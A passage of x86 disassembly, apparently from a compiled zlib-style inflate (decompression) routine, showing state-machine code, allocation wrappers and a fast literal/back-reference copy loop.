   1ca4f:	call   0x1d9a6
   1ca54:	jmp    0x1ca5b
   1ca56:	call   0x1d504
   1ca5b:	mov    ecx,DWORD PTR [ebp+0x8]
   1ca5e:	mov    DWORD PTR [esi+0x18],eax
   1ca61:	mov    DWORD PTR [ecx+0x30],eax
   1ca64:	mov    edx,ecx
   1ca66:	cmp    DWORD PTR [esi+0x10],0x0
   1ca6a:	mov    eax,DWORD PTR [ebp-0x10]
   1ca6d:	mov    DWORD PTR [ebp-0x1c],eax
   1ca70:	mov    eax,ebx
   1ca72:	jne    0x1ca97
   1ca74:	and    eax,0xff00
   1ca79:	mov    ecx,ebx
   1ca7b:	shl    ecx,0x10
   1ca7e:	add    eax,ecx
   1ca80:	mov    ecx,ebx
   1ca82:	shr    ecx,0x8
   1ca85:	and    ecx,0xff00
   1ca8b:	shl    eax,0x8
   1ca8e:	add    eax,ecx
   1ca90:	mov    ecx,ebx
   1ca92:	shr    ecx,0x18
   1ca95:	add    eax,ecx
   1ca97:	cmp    eax,DWORD PTR [esi+0x18]
   1ca9a:	je     0x1caa5
   1ca9c:	mov    DWORD PTR [edx+0x18],0x1ec16
   1caa3:	jmp    0x1caef
   1caa5:	xor    ebx,ebx
   1caa7:	xor    edi,edi
   1caa9:	mov    DWORD PTR [esi],0x19
   1caaf:	cmp    DWORD PTR [esi+0x8],0x0
   1cab3:	je     0x1cb2d
   1cab5:	cmp    DWORD PTR [esi+0x10],0x0
   1cab9:	je     0x1cb2d
   1cabb:	cmp    edi,0x20
   1cabe:	jae    0x1cae3
   1cac0:	cmp    DWORD PTR [ebp-0x8],0x0
   1cac4:	je     0x1cb43
   1cac6:	mov    eax,DWORD PTR [ebp-0x4]
   1cac9:	movzx  eax,BYTE PTR [eax]
   1cacc:	dec    DWORD PTR [ebp-0x8]
   1cacf:	mov    ecx,edi
   1cad1:	shl    eax,cl
   1cad3:	add    edi,0x8
   1cad6:	add    ebx,eax
   1cad8:	inc    DWORD PTR [ebp-0x4]
   1cadb:	cmp    edi,0x20
   1cade:	jb     0x1cac0
   1cae0:	mov    edx,DWORD PTR [ebp+0x8]
   1cae3:	cmp    ebx,DWORD PTR [esi+0x1c]
   1cae6:	je     0x1cb29
   1cae8:	mov    DWORD PTR [edx+0x18],0x1ebfe
   1caef:	mov    DWORD PTR [esi],0x1b
   1caf5:	mov    eax,DWORD PTR [esi]
   1caf7:	cmp    eax,0x1c
   1cafa:	jbe    0x1baec
   1cb00:	jmp    0x1bae2
   1cb05:	mov    eax,DWORD PTR [ebp-0x18]
   1cb08:	mov    DWORD PTR [edx+0xc],eax
   1cb0b:	mov    eax,DWORD PTR [ebp-0x10]
   1cb0e:	mov    DWORD PTR [edx+0x10],eax
   1cb11:	mov    eax,DWORD PTR [ebp-0x4]
   1cb14:	mov    DWORD PTR [edx],eax
   1cb16:	mov    eax,DWORD PTR [ebp-0x8]
   1cb19:	mov    DWORD PTR [edx+0x4],eax
   1cb1c:	mov    DWORD PTR [esi+0x38],ebx
   1cb1f:	mov    DWORD PTR [esi+0x3c],edi
   1cb22:	push   0x2
   1cb24:	jmp    0x1bae4
   1cb29:	xor    ebx,ebx
   1cb2b:	xor    edi,edi
   1cb2d:	mov    DWORD PTR [esi],0x1a
   1cb33:	mov    DWORD PTR [ebp-0x24],0x1
   1cb3a:	jmp    0x1cb43
   1cb3c:	mov    DWORD PTR [ebp-0x24],0xfffffffd
   1cb43:	mov    eax,DWORD PTR [ebp+0x8]
   1cb46:	mov    ecx,DWORD PTR [ebp-0x18]
   1cb49:	mov    DWORD PTR [eax+0xc],ecx
   1cb4c:	mov    ecx,DWORD PTR [ebp-0x10]
   1cb4f:	mov    DWORD PTR [eax+0x10],ecx
   1cb52:	mov    ecx,DWORD PTR [ebp-0x4]
   1cb55:	mov    DWORD PTR [eax],ecx
   1cb57:	mov    ecx,DWORD PTR [ebp-0x8]
   1cb5a:	mov    DWORD PTR [eax+0x4],ecx
   1cb5d:	cmp    DWORD PTR [esi+0x28],0x0
   1cb61:	mov    DWORD PTR [esi+0x38],ebx
   1cb64:	mov    DWORD PTR [esi+0x3c],edi
   1cb67:	jne    0x1cb79
   1cb69:	cmp    DWORD PTR [esi],0x18
   1cb6c:	jge    0x1cb95
   1cb6e:	mov    eax,DWORD PTR [ebp-0x1c]
   1cb71:	mov    ecx,DWORD PTR [ebp+0x8]
   1cb74:	cmp    eax,DWORD PTR [ecx+0x10]
   1cb77:	je     0x1cb95
   1cb79:	mov    eax,DWORD PTR [ebp-0x1c]
   1cb7c:	mov    edi,DWORD PTR [ebp+0x8]
   1cb7f:	call   0x1b9a4
   1cb84:	test   eax,eax
   1cb86:	je     0x1cb95
   1cb88:	mov    DWORD PTR [esi],0x1c
   1cb8e:	push   0xfffffffc
   1cb90:	jmp    0x1bae4
   1cb95:	mov    edi,DWORD PTR [ebp+0x8]
   1cb98:	mov    eax,DWORD PTR [ebp-0x2c]
   1cb9b:	sub    eax,DWORD PTR [edi+0x4]
   1cb9e:	mov    ebx,DWORD PTR [ebp-0x1c]
   1cba1:	sub    ebx,DWORD PTR [edi+0x10]
   1cba4:	add    DWORD PTR [edi+0x8],eax
   1cba7:	add    DWORD PTR [edi+0x14],ebx
   1cbaa:	add    DWORD PTR [esi+0x1c],ebx
   1cbad:	cmp    DWORD PTR [esi+0x8],0x0
   1cbb1:	mov    DWORD PTR [ebp-0x2c],eax
   1cbb4:	je     0x1cbdf
   1cbb6:	test   ebx,ebx
   1cbb8:	je     0x1cbdf
   1cbba:	mov    eax,DWORD PTR [edi+0xc]
   1cbbd:	push   ebx
   1cbbe:	sub    eax,ebx
   1cbc0:	cmp    DWORD PTR [esi+0x10],0x0
   1cbc4:	push   eax
   1cbc5:	push   DWORD PTR [esi+0x18]
   1cbc8:	je     0x1cbd1
   1cbca:	call   0x1d9a6
   1cbcf:	jmp    0x1cbd6
   1cbd1:	call   0x1d504
   1cbd6:	mov    DWORD PTR [esi+0x18],eax
   1cbd9:	mov    DWORD PTR [edi+0x30],eax
   1cbdc:	mov    eax,DWORD PTR [ebp-0x2c]
   1cbdf:	cmp    DWORD PTR [esi],0xb
   1cbe2:	jne    0x1cbeb
   1cbe4:	mov    ecx,0x80
   1cbe9:	jmp    0x1cbed
   1cbeb:	xor    ecx,ecx
   1cbed:	mov    edx,DWORD PTR [esi+0x4]
   1cbf0:	neg    edx
   1cbf2:	sbb    edx,edx
   1cbf4:	and    edx,0x40
   1cbf7:	add    edx,ecx
   1cbf9:	add    edx,DWORD PTR [esi+0x3c]
   1cbfc:	mov    DWORD PTR [edi+0x2c],edx
   1cbff:	test   eax,eax
   1cc01:	jne    0x1cc07
   1cc03:	test   ebx,ebx
   1cc05:	je     0x1cc0d
   1cc07:	cmp    DWORD PTR [ebp+0xc],0x4
   1cc0b:	jne    0x1cc1a
   1cc0d:	cmp    DWORD PTR [ebp-0x24],0x0
   1cc11:	jne    0x1cc1a
   1cc13:	mov    DWORD PTR [ebp-0x24],0xfffffffb
   1cc1a:	mov    eax,DWORD PTR [ebp-0x24]
   1cc1d:	jmp    0x1bae5
   1cc22:	mov    edi,edi
   1cc24:	idiv   BYTE PTR [edx-0x43ecffff]
   1cc2a:	add    DWORD PTR [eax],eax
   1cc2c:	test   al,0xbc
   1cc2e:	add    DWORD PTR [eax],eax
   1cc30:	push   ds
   1cc31:	mov    ebp,0xbd970001
   1cc36:	add    DWORD PTR [eax],eax
   1cc38:	push   ss
   1cc39:	mov    esi,0xbeb10001
   1cc3e:	add    DWORD PTR [eax],eax
   1cc40:	dec    edx
   1cc41:	mov    edi,0xbfdf0001
   1cc46:	add    DWORD PTR [eax],eax
   1cc48:	pop    edi
   1cc49:	rol    BYTE PTR [ecx],0x0
   1cc4c:	mov    ebp,0xe00001c0
   1cc51:	rol    BYTE PTR [ecx],0x0
   1cc54:	in     eax,dx
   1cc55:	rol    BYTE PTR [ecx],0x0
   1cc58:	pushf  
   1cc59:	rol    DWORD PTR [ecx],0x0
   1cc5c:	cld    
   1cc5d:	rol    DWORD PTR [ecx],0x0
   1cc60:	push   edx
   1cc61:	ret    0x1
   1cc64:	adc    al,0xc3
   1cc66:	add    DWORD PTR [eax],eax
   1cc68:	add    ch,0x1
   1cc6b:	add    dl,ch
   1cc6d:	lds    eax,FWORD PTR [ecx]
   1cc6f:	add    BYTE PTR [ebp-0x34fffe39],al
   1cc75:	mov    DWORD PTR [ecx],0x1c8e600
   1cc7b:	add    BYTE PTR [edx-0x37],cl
   1cc7e:	add    DWORD PTR [eax],eax
   1cc80:	ror    cl,cl
   1cc82:	add    DWORD PTR [eax],eax
   1cc84:	cmc    
   1cc85:	leave  
   1cc86:	add    DWORD PTR [eax],eax
   1cc88:	scas   eax,DWORD PTR es:[edi]
   1cc89:	retf   0x1
   1cc8c:	xor    ecx,ebx
   1cc8e:	add    DWORD PTR [eax],eax
   1cc90:	cmp    al,0xcb
   1cc92:	add    DWORD PTR [eax],eax
   1cc94:	mov    cs,ebx
   1cc96:	add    DWORD PTR [eax],eax
   1cc98:	int3   
   1cc99:	int3   
   1cc9a:	int3   
   1cc9b:	int3   
   1cc9c:	int3   
   1cc9d:	int3   
   1cc9e:	mov    edi,edi
   1cca0:	push   ebp
   1cca1:	mov    ebp,esp
   1cca3:	push   esi
   1cca4:	mov    esi,DWORD PTR [ebp+0x8]
   1cca7:	test   esi,esi
   1cca9:	je     0x1ccd7
   1ccab:	mov    eax,DWORD PTR [esi+0x1c]
   1ccae:	test   eax,eax
   1ccb0:	je     0x1ccd7
   1ccb2:	mov    ecx,DWORD PTR [esi+0x24]
   1ccb5:	test   ecx,ecx
   1ccb7:	je     0x1ccd7
   1ccb9:	mov    eax,DWORD PTR [eax+0x34]
   1ccbc:	test   eax,eax
   1ccbe:	je     0x1ccc6
   1ccc0:	push   eax
   1ccc1:	push   DWORD PTR [esi+0x28]
   1ccc4:	call   ecx
   1ccc6:	push   DWORD PTR [esi+0x1c]
   1ccc9:	push   DWORD PTR [esi+0x28]
   1cccc:	call   DWORD PTR [esi+0x24]
   1cccf:	and    DWORD PTR [esi+0x1c],0x0
   1ccd3:	xor    eax,eax
   1ccd5:	jmp    0x1ccda
   1ccd7:	push   0xfffffffe
   1ccd9:	pop    eax
   1ccda:	pop    esi
   1ccdb:	pop    ebp
   1ccdc:	ret    0x4
   1ccdf:	int3   
   1cce0:	int3   
   1cce1:	int3   
   1cce2:	int3   
   1cce3:	int3   
   1cce4:	mov    edi,edi
   1cce6:	push   ebp
   1cce7:	mov    ebp,esp
   1cce9:	mov    eax,DWORD PTR [ebp+0xc]
   1ccec:	imul   eax,DWORD PTR [ebp+0x10]
   1ccf0:	push   eax
   1ccf1:	call   0x1d9ca
   1ccf6:	pop    ecx
   1ccf7:	pop    ebp
   1ccf8:	ret    0xc
   1ccfb:	int3   
   1ccfc:	int3   
   1ccfd:	int3   
   1ccfe:	int3   
   1ccff:	int3   
   1cd00:	mov    edi,edi
   1cd02:	push   ebp
   1cd03:	mov    ebp,esp
   1cd05:	push   DWORD PTR [ebp+0xc]
   1cd08:	call   0x1d9f8
   1cd0d:	pop    ecx
   1cd0e:	pop    ebp
   1cd0f:	ret    0x8
   1cd12:	int3   
   1cd13:	int3   
   1cd14:	int3   
   1cd15:	int3   
   1cd16:	int3   
   1cd17:	int3   
   1cd18:	mov    edi,edi
   1cd1a:	push   ebp
   1cd1b:	mov    ebp,esp
   1cd1d:	sub    esp,0x40
   1cd20:	mov    eax,DWORD PTR [ebp+0x8]
   1cd23:	mov    ecx,DWORD PTR [eax+0x4]
   1cd26:	mov    edx,DWORD PTR [eax+0x10]
   1cd29:	push   ebx
   1cd2a:	mov    ebx,DWORD PTR [eax]
   1cd2c:	dec    ebx
   1cd2d:	lea    ecx,[ecx+ebx*1-0x5]
   1cd31:	mov    DWORD PTR [ebp-0x2c],ecx
   1cd34:	mov    ecx,edx
   1cd36:	sub    ecx,DWORD PTR [ebp+0xc]
   1cd39:	push   esi
   1cd3a:	mov    esi,DWORD PTR [eax+0x1c]
   1cd3d:	push   edi
   1cd3e:	mov    edi,DWORD PTR [eax+0xc]
   1cd41:	dec    edi
   1cd42:	add    ecx,edi
   1cd44:	mov    DWORD PTR [ebp-0x3c],ecx
   1cd47:	lea    ecx,[edx+edi*1-0x101]
   1cd4e:	mov    DWORD PTR [ebp-0x30],ecx
   1cd51:	mov    ecx,DWORD PTR [esi+0x28]
   1cd54:	mov    DWORD PTR [ebp-0x24],ecx
   1cd57:	mov    ecx,DWORD PTR [esi+0x2c]
   1cd5a:	mov    DWORD PTR [ebp-0x40],ecx
   1cd5d:	mov    ecx,DWORD PTR [esi+0x30]
   1cd60:	mov    DWORD PTR [ebp-0x18],ecx
   1cd63:	mov    ecx,DWORD PTR [esi+0x34]
   1cd66:	mov    DWORD PTR [ebp-0x28],ecx
   1cd69:	mov    ecx,DWORD PTR [esi+0x38]
   1cd6c:	mov    DWORD PTR [ebp-0x4],ecx
   1cd6f:	mov    ecx,DWORD PTR [esi+0x3c]
   1cd72:	mov    DWORD PTR [ebp+0xc],ecx
   1cd75:	mov    ecx,DWORD PTR [esi+0x4c]
   1cd78:	xor    edx,edx
   1cd7a:	mov    DWORD PTR [ebp-0x1c],ecx
   1cd7d:	mov    ecx,DWORD PTR [esi+0x50]
   1cd80:	inc    edx
   1cd81:	mov    DWORD PTR [ebp-0x20],ecx
   1cd84:	mov    ecx,DWORD PTR [esi+0x54]
   1cd87:	shl    edx,cl
   1cd89:	mov    ecx,DWORD PTR [esi+0x58]
   1cd8c:	dec    edx
   1cd8d:	mov    DWORD PTR [ebp-0x34],edx
   1cd90:	xor    edx,edx
   1cd92:	inc    edx
   1cd93:	shl    edx,cl
   1cd95:	dec    edx
   1cd96:	mov    DWORD PTR [ebp-0x38],edx
   1cd99:	mov    ecx,DWORD PTR [ebp+0xc]
   1cd9c:	cmp    ecx,0xf
   1cd9f:	jae    0x1cdbe
   1cda1:	add    DWORD PTR [ebp+0xc],0x8
   1cda5:	inc    ebx
   1cda6:	movzx  edx,BYTE PTR [ebx]
   1cda9:	shl    edx,cl
   1cdab:	mov    ecx,DWORD PTR [ebp+0xc]
   1cdae:	add    DWORD PTR [ebp-0x4],edx
   1cdb1:	inc    ebx
   1cdb2:	movzx  edx,BYTE PTR [ebx]
   1cdb5:	shl    edx,cl
   1cdb7:	add    DWORD PTR [ebp-0x4],edx
   1cdba:	add    DWORD PTR [ebp+0xc],0x8
   1cdbe:	mov    ecx,DWORD PTR [ebp-0x34]
   1cdc1:	and    ecx,DWORD PTR [ebp-0x4]
   1cdc4:	mov    edx,DWORD PTR [ebp-0x1c]
   1cdc7:	mov    ecx,DWORD PTR [edx+ecx*4]
   1cdca:	mov    DWORD PTR [ebp-0x10],ecx
   1cdcd:	mov    edx,DWORD PTR [ebp-0x10]
   1cdd0:	shr    ecx,0x8
   1cdd3:	movzx  ecx,cl
   1cdd6:	shr    DWORD PTR [ebp-0x4],cl
   1cdd9:	sub    DWORD PTR [ebp+0xc],ecx
   1cddc:	mov    DWORD PTR [ebp-0x8],ecx
   1cddf:	movzx  ecx,dl
   1cde2:	mov    DWORD PTR [ebp-0x8],ecx
   1cde5:	test   ecx,ecx
   1cde7:	je     0x1ce30
   1cde9:	mov    ecx,DWORD PTR [ebp-0x8]
   1cdec:	test   cl,0x10
   1cdef:	jne    0x1ce3b
   1cdf1:	test   cl,0x40
   1cdf4:	jne    0x1d08a
   1cdfa:	xor    edx,edx
   1cdfc:	inc    edx
   1cdfd:	shl    edx,cl
   1cdff:	mov    ecx,DWORD PTR [ebp-0x10]
   1ce02:	shr    ecx,0x10
   1ce05:	dec    edx
   1ce06:	and    edx,DWORD PTR [ebp-0x4]
   1ce09:	add    edx,ecx
   1ce0b:	mov    ecx,DWORD PTR [ebp-0x1c]
   1ce0e:	mov    ecx,DWORD PTR [ecx+edx*4]
   1ce11:	mov    DWORD PTR [ebp-0x10],ecx
   1ce14:	mov    edx,DWORD PTR [ebp-0x10]
   1ce17:	shr    ecx,0x8
   1ce1a:	movzx  ecx,cl
   1ce1d:	shr    DWORD PTR [ebp-0x4],cl
   1ce20:	sub    DWORD PTR [ebp+0xc],ecx
   1ce23:	mov    DWORD PTR [ebp-0x8],ecx
   1ce26:	movzx  ecx,dl
   1ce29:	mov    DWORD PTR [ebp-0x8],ecx
   1ce2c:	test   ecx,ecx
   1ce2e:	jne    0x1cde9
   1ce30:	inc    edi
   1ce31:	shr    edx,0x10
   1ce34:	mov    BYTE PTR [edi],dl
   1ce36:	jmp    0x1d068
   1ce3b:	shr    edx,0x10
   1ce3e:	and    ecx,0xf
   1ce41:	mov    DWORD PTR [ebp-0xc],edx
   1ce44:	mov    DWORD PTR [ebp-0x8],ecx
   1ce47:	je     0x1ce73
   1ce49:	mov    ecx,DWORD PTR [ebp+0xc]
   1ce4c:	cmp    ecx,DWORD PTR [ebp-0x8]
   1ce4f:	jae    0x1ce5e
   1ce51:	inc    ebx
   1ce52:	movzx  edx,BYTE PTR [ebx]
   1ce55:	shl    edx,cl
   1ce57:	add    DWORD PTR [ebp-0x4],edx
   1ce5a:	add    DWORD PTR [ebp+0xc],0x8
   1ce5e:	mov    ecx,DWORD PTR [ebp-0x8]
   1ce61:	xor    edx,edx
   1ce63:	inc    edx
   1ce64:	shl    edx,cl
   1ce66:	dec    edx
   1ce67:	and    edx,DWORD PTR [ebp-0x4]
   1ce6a:	shr    DWORD PTR [ebp-0x4],cl
   1ce6d:	add    DWORD PTR [ebp-0xc],edx
   1ce70:	sub    DWORD PTR [ebp+0xc],ecx
   1ce73:	mov    ecx,DWORD PTR [ebp+0xc]
   1ce76:	cmp    ecx,0xf
   1ce79:	jae    0x1ce98
   1ce7b:	add    DWORD PTR [ebp+0xc],0x8
   1ce7f:	inc    ebx
   1ce80:	movzx  edx,BYTE PTR [ebx]
   1ce83:	shl    edx,cl
   1ce85:	mov    ecx,DWORD PTR [ebp+0xc]
   1ce88:	add    DWORD PTR [ebp-0x4],edx
   1ce8b:	inc    ebx
   1ce8c:	movzx  edx,BYTE PTR [ebx]
   1ce8f:	shl    edx,cl
   1ce91:	add    DWORD PTR [ebp-0x4],edx
   1ce94:	add    DWORD PTR [ebp+0xc],0x8
   1ce98:	mov    ecx,DWORD PTR [ebp-0x38]
   1ce9b:	and    ecx,DWORD PTR [ebp-0x4]
   1ce9e:	mov    edx,DWORD PTR [ebp-0x20]
   1cea1:	mov    ecx,DWORD PTR [edx+ecx*4]
   1cea4:	jmp    0x1cec4
   1cea6:	test   cl,0x40
   1cea9:	jne    0x1d081
   1ceaf:	xor    edx,edx
   1ceb1:	inc    edx
   1ceb2:	shl    edx,cl
   1ceb4:	movzx  ecx,WORD PTR [ebp-0xe]
   1ceb8:	dec    edx
   1ceb9:	and    edx,DWORD PTR [ebp-0x4]
   1cebc:	add    edx,ecx
   1cebe:	mov    ecx,DWORD PTR [ebp-0x20]
   1cec1:	mov    ecx,DWORD PTR [ecx+edx*4]
   1cec4:	mov    DWORD PTR [ebp-0x10],ecx
   1cec7:	mov    edx,DWORD PTR [ebp-0x10]
   1ceca:	shr    ecx,0x8
   1cecd:	movzx  ecx,cl
   1ced0:	shr    DWORD PTR [ebp-0x4],cl
   1ced3:	sub    DWORD PTR [ebp+0xc],ecx
   1ced6:	mov    DWORD PTR [ebp-0x8],ecx
   1ced9:	movzx  ecx,dl
   1cedc:	test   cl,0x10
   1cedf:	je     0x1cea6
   1cee1:	and    ecx,0xf
   1cee4:	shr    edx,0x10
   1cee7:	mov    DWORD PTR [ebp-0x14],edx
   1ceea:	mov    DWORD PTR [ebp-0x8],ecx
   1ceed:	cmp    DWORD PTR [ebp+0xc],ecx
   1cef0:	jae    0x1cf1d
   1cef2:	mov    ecx,DWORD PTR [ebp+0xc]
   1cef5:	add    DWORD PTR [ebp+0xc],0x8
   1cef9:	inc    ebx
   1cefa:	movzx  edx,BYTE PTR [ebx]
   1cefd:	shl    edx,cl
   1ceff:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf02:	add    DWORD PTR [ebp-0x4],edx
   1cf05:	cmp    DWORD PTR [ebp+0xc],ecx
   1cf08:	jae    0x1cf1d
   1cf0a:	mov    ecx,DWORD PTR [ebp+0xc]
   1cf0d:	inc    ebx
   1cf0e:	movzx  edx,BYTE PTR [ebx]
   1cf11:	shl    edx,cl
   1cf13:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf16:	add    DWORD PTR [ebp-0x4],edx
   1cf19:	add    DWORD PTR [ebp+0xc],0x8
   1cf1d:	xor    edx,edx
   1cf1f:	inc    edx
   1cf20:	shl    edx,cl
   1cf22:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf25:	sub    DWORD PTR [ebp+0xc],ecx
   1cf28:	dec    edx
   1cf29:	and    edx,DWORD PTR [ebp-0x4]
   1cf2c:	shr    DWORD PTR [ebp-0x4],cl
   1cf2f:	add    DWORD PTR [ebp-0x14],edx
   1cf32:	mov    edx,DWORD PTR [ebp-0x14]
   1cf35:	mov    ecx,edi
   1cf37:	sub    ecx,DWORD PTR [ebp-0x3c]
   1cf3a:	cmp    edx,ecx
   1cf3c:	jbe    0x1d030
   1cf42:	sub    edx,ecx
   1cf44:	mov    DWORD PTR [ebp-0x8],edx
   1cf47:	cmp    edx,DWORD PTR [ebp-0x40]
   1cf4a:	ja     0x1d078
   1cf50:	mov    ecx,DWORD PTR [ebp-0x28]
   1cf53:	dec    ecx
   1cf54:	mov    DWORD PTR [ebp-0x10],ecx
   1cf57:	mov    ecx,DWORD PTR [ebp-0x18]
   1cf5a:	test   ecx,ecx
   1cf5c:	jne    0x1cf84
   1cf5e:	mov    ecx,DWORD PTR [ebp-0x24]
   1cf61:	sub    ecx,edx
   1cf63:	add    DWORD PTR [ebp-0x10],ecx
   1cf66:	mov    ecx,edx
   1cf68:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cf6b:	jae    0x1cff9
   1cf71:	sub    DWORD PTR [ebp-0xc],ecx
   1cf74:	mov    ecx,DWORD PTR [ebp-0x10]
   1cf77:	inc    ecx
   1cf78:	mov    dl,BYTE PTR [ecx]
   1cf7a:	inc    edi
   1cf7b:	dec    DWORD PTR [ebp-0x8]
   1cf7e:	mov    BYTE PTR [edi],dl
   1cf80:	jne    0x1cf77
   1cf82:	jmp    0x1cfcf
   1cf84:	cmp    ecx,edx
   1cf86:	jae    0x1cfd9
   1cf88:	sub    ecx,edx
   1cf8a:	add    ecx,DWORD PTR [ebp-0x24]
   1cf8d:	add    DWORD PTR [ebp-0x10],ecx
   1cf90:	mov    ecx,DWORD PTR [ebp-0x8]
   1cf93:	sub    ecx,DWORD PTR [ebp-0x18]
   1cf96:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cf99:	jae    0x1cff9
   1cf9b:	sub    DWORD PTR [ebp-0xc],ecx
   1cf9e:	inc    DWORD PTR [ebp-0x10]
   1cfa1:	mov    edx,DWORD PTR [ebp-0x10]
   1cfa4:	mov    dl,BYTE PTR [edx]
   1cfa6:	inc    edi
   1cfa7:	dec    ecx
   1cfa8:	mov    BYTE PTR [edi],dl
   1cfaa:	jne    0x1cf9e
   1cfac:	mov    ecx,DWORD PTR [ebp-0x28]
   1cfaf:	dec    ecx
   1cfb0:	mov    DWORD PTR [ebp-0x10],ecx
   1cfb3:	mov    ecx,DWORD PTR [ebp-0x18]
   1cfb6:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cfb9:	jae    0x1cff9
   1cfbb:	sub    DWORD PTR [ebp-0xc],ecx
   1cfbe:	mov    DWORD PTR [ebp-0x8],ecx
   1cfc1:	mov    ecx,DWORD PTR [ebp-0x10]
   1cfc4:	inc    ecx
   1cfc5:	mov    dl,BYTE PTR [ecx]
   1cfc7:	inc    edi
   1cfc8:	dec    DWORD PTR [ebp-0x8]
   1cfcb:	mov    BYTE PTR [edi],dl
   1cfcd:	jne    0x1cfc4
   1cfcf:	mov    ecx,edi
   1cfd1:	sub    ecx,DWORD PTR [ebp-0x14]
   1cfd4:	mov    DWORD PTR [ebp-0x10],ecx
   1cfd7:	jmp    0x1cffc
   1cfd9:	sub    ecx,edx
   1cfdb:	add    DWORD PTR [ebp-0x10],ecx
   1cfde:	mov    ecx,DWORD PTR [ebp-0x8]
   1cfe1:	cmp    ecx,DWORD PTR [ebp-0xc]
   1cfe4:	jae    0x1cff9
   1cfe6:	sub    DWORD PTR [ebp-0xc],ecx
   1cfe9:	mov    ecx,DWORD PTR [ebp-0x10]
   1cfec:	inc    ecx
   1cfed:	mov    dl,BYTE PTR [ecx]
   1cfef:	inc    edi
   1cff0:	dec    DWORD PTR [ebp-0x8]
   1cff3:	mov    BYTE PTR [edi],dl
   1cff5:	jne    0x1cfec
   1cff7:	jmp    0x1cfcf
   1cff9:	mov    ecx,DWORD PTR [ebp-0x10]
   1cffc:	mov    edx,DWORD PTR [ebp-0xc]
   1cfff:	cmp    edx,0x2
   1d002:	jbe    0x1d050
   1d004:	lea    eax,[edx-0x3]
   1d007:	push   0x3
   1d009:	xor    edx,edx
   1d00b:	pop    ecx
   1d00c:	div    ecx
   1d00e:	mov    ecx,DWORD PTR [ebp-0x10]
   1d011:	inc    eax
   1d012:	sub    DWORD PTR [ebp-0xc],0x3
   1d016:	inc    ecx
   1d017:	mov    dl,BYTE PTR [ecx]
   1d019:	inc    edi
   1d01a:	mov    BYTE PTR [edi],dl
   1d01c:	inc    ecx
   1d01d:	mov    dl,BYTE PTR [ecx]
   1d01f:	inc    edi
   1d020:	inc    ecx
   1d021:	mov    BYTE PTR [edi],dl
   1d023:	mov    dl,BYTE PTR [ecx]
   1d025:	inc    edi
   1d026:	dec    eax
   1d027:	mov    BYTE PTR [edi],dl
   1d029:	jne    0x1d012
   1d02b:	mov    eax,DWORD PTR [ebp+0x8]
   1d02e:	jmp    0x1d050
   1d030:	mov    ecx,edi
   1d032:	sub    ecx,edx
   1d034:	sub    DWORD PTR [ebp-0xc],0x3
   1d038:	inc    ecx
   1d039:	mov    dl,BYTE PTR [ecx]
   1d03b:	inc    edi
   1d03c:	mov    BYTE PTR [edi],dl
   1d03e:	inc    ecx
   1d03f:	mov    dl,BYTE PTR [ecx]
   1d041:	inc    edi
   1d042:	inc    ecx
   1d043:	mov    BYTE PTR [edi],dl
   1d045:	mov    dl,BYTE PTR [ecx]
   1d047:	inc    edi
   1d048:	cmp    DWORD PTR [ebp-0xc],0x2
   1d04c:	mov    BYTE PTR [edi],dl
   1d04e:	ja     0x1d034
   1d050:	cmp    DWORD PTR [ebp-0xc],0x0
   1d054:	je     0x1d068
   1d056:	inc    ecx
   1d057:	mov    dl,BYTE PTR [ecx]
   1d059:	inc    edi
   1d05a:	cmp    DWORD PTR [ebp-0xc],0x1
   1d05e:	mov    BYTE PTR [edi],dl
   1d060:	jbe    0x1d068
   1d062:	mov    cl,BYTE PTR [ecx+0x1]
   1d065:	inc    edi
   1d066:	mov    BYTE PTR [edi],cl
   1d068:	cmp    ebx,DWORD PTR [ebp-0x2c]
   1d06b:	jae    0x1d0a4
   1d06d:	cmp    edi,DWORD PTR [ebp-0x30]
   1d070:	jb     0x1cd99
   1d076:	jmp    0x1d0a4
   1d078:	mov    DWORD PTR [eax+0x18],0x1ec2c
   1d07f:	jmp    0x1d09e
   1d081:	mov    DWORD PTR [eax+0x18],0x1ec4a
   1d088:	jmp    0x1d09e
   1d08a:	test   cl,0x20
   1d08d:	je     0x1d097
   1d08f:	mov    DWORD PTR [esi],0xb
   1d095:	jmp    0x1d0a4
   1d097:	mov    DWORD PTR [eax+0x18],0x1ec60
   1d09e:	mov    DWORD PTR [esi],0x1b
   1d0a4:	mov    ecx,DWORD PTR [ebp+0xc]
   1d0a7:	shr    ecx,0x3
   1d0aa:	sub    ebx,ecx
   1d0ac:	shl    ecx,0x3
   1d0af:	sub    DWORD PTR [ebp+0xc],ecx
   1d0b2:	xor    ecx,ecx
   1d0b4:	inc    ecx
   1d0b5:	mov    edx,ecx
   1d0b7:	mov    ecx,DWORD PTR [ebp+0xc]
   1d0ba:	shl    edx,cl
   1d0bc:	dec    edx
   1d0bd:	mov    ecx,edx
   1d0bf:	mov    edx,DWORD PTR [ebp-0x4]
   1d0c2:	and    edx,ecx
   1d0c4:	lea    ecx,[ebx+0x1]
   1d0c7:	mov    DWORD PTR [eax],ecx
   1d0c9:	lea    ecx,[edi+0x1]
   1d0cc:	mov    DWORD PTR [eax+0xc],ecx
   1d0cf:	mov    ecx,DWORD PTR [ebp-0x2c]
   1d0d2:	sub    ecx,ebx
   1d0d4:	add    ecx,0x5
   1d0d7:	mov    DWORD PTR [eax+0x4],ecx
   1d0da:	mov    ecx,DWORD PTR [ebp-0x30]
   1d0dd:	sub    ecx,edi
   1d0df:	add    ecx,0x101
   1d0e5:	mov    DWORD PTR [eax+0x10],ecx
   1d0e8:	mov    eax,DWORD PTR [ebp+0xc]
   1d0eb:	pop    edi
   1d0ec:	mov    DWORD PTR [esi+0x38],edx
   1d0ef:	mov    DWORD PTR [esi+0x3c],eax
   1d0f2:	pop    esi
   1d0f3:	pop    ebx
   1d0f4:	leave  
   1d0f5:	ret    0x8
   1d0f8:	int3   
   1d0f9:	int3   
   1d0fa:	int3   
   1d0fb:	int3   
   1d0fc:	int3   
   1d0fd:	int3   
   1d0fe:	mov    edi,edi
   1d100:	push   ebp
   1d101:	mov    ebp,esp
   1d103:	sub    esp,0x90
   1d109:	mov    eax,ds:0x7e528
   1d10e:	xor    eax,ebp
   1d110:	mov    DWORD PTR [ebp-0x4],eax
   1d113:	mov    eax,DWORD PTR [ebp+0xc]
   1d116:	mov    edx,DWORD PTR [ebp+0x18]
   1d119:	mov    DWORD PTR [ebp-0x7c],eax
